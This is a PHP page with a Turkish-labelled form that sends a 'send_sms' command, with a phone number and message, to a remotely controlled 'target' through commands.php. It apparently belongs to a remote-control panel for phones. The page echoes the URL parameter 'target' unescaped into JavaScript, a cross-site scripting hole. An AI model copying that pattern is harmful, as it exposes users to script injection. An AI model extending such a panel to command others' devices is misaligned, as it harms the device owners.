<?php 
require_once 'module_controller.php';
?>
    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">

                <div class="row"></div>
                <br><br>
                <legend>Mesaj Gönder</legend>
                <div class="row">
                    <form class="form-horizontal col-md-8 col-lg-offset-1">
                        <fieldset>
                            <div class="form-group">
                                <label for="phone-number-id" class="col-lg-2 control-label">Tel. No.</label>
                                <div class="col-lg-5">
                                    <input class="form-control" id="phone-number-id" placeholder="+905000000000" type="text">
                                </div>
                            </div>

                            <div class="form-group">
                                <label for="sms-content-id" class="col-lg-2 control-label">Mesaj</label>
                                <div class="col-lg-10">
                                    <textarea class="form-control" rows="4" id="sms-content-id" placeholder="Sms içeriğini yazınız..."></textarea>
                                </div>
                            </div>

                            <div class="form-group">
                                <div class="col-lg-10 col-lg-offset-2">
                                    <button id="send-btn-id" name="send-btn-id" type="button" class="btn btn-default">Gönder</button>
                                </div>
                            </div>
                        </fieldset>
                    </form>
                </div>
                <br><br>
            </div>
        </div>
    </div>

    <script>

        $("#send-btn-id").click(function() {
            var phoneNumber = $("#phone-number-id").val().trim()+'';
            var smsContent = $("#sms-content-id").val().trim()+'';

            if (phoneNumber != '' && smsContent!=''){

                var commands = {
                    send_command: true,
                    target:"<?php echo $_GET['target'];?>",
                    type: 'send_sms',
                    value: {
                            "phone_number": phoneNumber, "sms_content": smsContent
                        }
                };

                $.post( "commands.php", commands, function( data, err ) {
                    console.log(data);
                    if (data.status){
                        Toastify({
                            text: "Komut gönderildi.!",
                            backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                            className: "info",
                        }).showToast();
                    } else {
                        Toastify({
                            text: "Komut başarısız.!",
                            backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                            className: "info",
                        }).showToast();
                    }

                }, "json");
            } else {
                Toastify({
                    text: "Lütfen alanları boş bırakmayınız...!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        });

    </script>
